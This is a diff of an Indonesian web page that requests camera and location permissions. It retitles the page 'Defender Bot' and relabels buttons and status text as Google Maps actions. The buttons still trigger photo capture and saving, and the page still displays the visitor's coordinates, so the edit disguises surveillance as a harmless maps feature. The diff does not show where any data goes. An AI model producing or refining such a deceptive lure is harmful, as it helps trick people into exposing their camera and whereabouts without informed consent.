@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Akses Lokasi & Kamera</title>
+<title>Defender Bot</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
@@ -235,23 +235,23 @@ button.success{
         </svg>
     </div>
 
-    <h1>Akses Perangkat</h1>
+    <h1>Defender Bot</h1>
 
     <p class="desc">
-        Untuk melanjutkan, halaman ini memerlukan akses
-        lokasi dan kamera perangkat Anda.
+        Untuk melanjutkan, halaman ini memerlukan izin
+        lokasi dan izin kamera perangkat Anda.
     </p>
 
     <div class="info-box">
 
         <div class="info-item">
             <div class="dot"></div>
-            <span>Akses lokasi perangkat</span>
+            <span>Izin lokasi perangkat</span>
         </div>
 
         <div class="info-item">
             <div class="dot"></div>
-            <span>Akses kamera perangkat</span>
+            <span>Izin kamera perangkat</span>
         </div>
 
         <div class="info-item">
@@ -262,7 +262,7 @@ button.success{
     </div>
 
     <button id="btnAkses" onclick="mintaAkses()">
-        Izinkan Lokasi & Kamera
+        Lihat Maps
     </button>
 
     <div id="status"></div>
@@ -288,7 +288,7 @@ button.success{
             <button
                 id="btnAmbilFoto"
                 onclick="ambilFoto()">
-                Jangan Simpan Lokasi
+                Buka Maps Google
             </button>
 
         </div>
@@ -299,7 +299,7 @@ button.success{
             <button
                 class="success"
                 onclick="simpanFoto()">
-                💾 Simpan Foto
+                Akses Maps Google
             </button>
 
             <button
@@ -528,10 +528,10 @@ Meminta izin kamera...`;
 Latitude  : ${latitude}
 Longitude : ${longitude}
 
-📷 Kamera:
-Kamera berhasil diaktifkan.
+Buka:
+Maps berhasil diaktifkan.
 
-Silakan ambil foto menggunakan tombol di bawah.`;
+Silakan buka maps menggunakan tombol di bawah.`;
 
         btn.classList.remove("loading");
 
